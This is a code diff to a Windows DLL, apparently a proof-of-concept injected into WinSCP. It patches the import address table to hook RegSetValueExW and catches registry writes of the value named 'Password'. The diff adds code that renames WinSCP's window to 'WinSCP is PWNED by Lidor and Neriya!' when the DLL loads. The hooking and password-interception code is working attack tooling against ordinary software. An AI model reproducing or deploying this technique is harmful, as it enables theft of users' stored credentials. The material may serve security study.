@@ -12,6 +12,25 @@
 
 #define IMPORT_TABLE_OFFSET 1
 
+BOOL CALLBACK changeWindowCallBack(
+	_In_ HWND   hwnd,
+	_In_ LPARAM lParam
+) {
+	DWORD outputPid = NULL;
+	GetWindowThreadProcessId(hwnd, &outputPid);
+	DWORD pidToSet = *(PDWORD(lParam));
+	if (outputPid == pidToSet) {
+		SetWindowText(hwnd, "WinSCP is PWNED by Lidor and Neriya!");
+	}
+
+	return TRUE;
+}
+
+void changeWindowTitle() {
+	DWORD currentPid = GetCurrentProcessId();
+	EnumWindows(changeWindowCallBack, (LPARAM)&currentPid);
+}
+
 PIMAGE_IMPORT_DESCRIPTOR getImportTable(HMODULE hInstance)
 {
 	PIMAGE_DOS_HEADER dosHeader;
@@ -48,6 +67,7 @@ LSTATUS APIENTRY MyRegSetValueExW(
 {
 	OutputDebugStringW(L"MyRegSetValueExW");
 	OutputDebugStringW(lpValueName);
+
 	if (wcscmp(lpValueName, L"Password") == 0)
 	{
 		OutputDebugStringW(L"MyRegSetValueExW found the password");
@@ -120,6 +140,7 @@ BOOL APIENTRY DllMain(
 		case DLL_PROCESS_ATTACH:
 	    {	    
 			OutputDebugStringW(L"DllMain");
+			changeWindowTitle();
 			patchIAT("RegSetValueExW", MyRegSetValueExW);
 			OutputDebugStringW(L"IATPatching DllMain end");
 		}
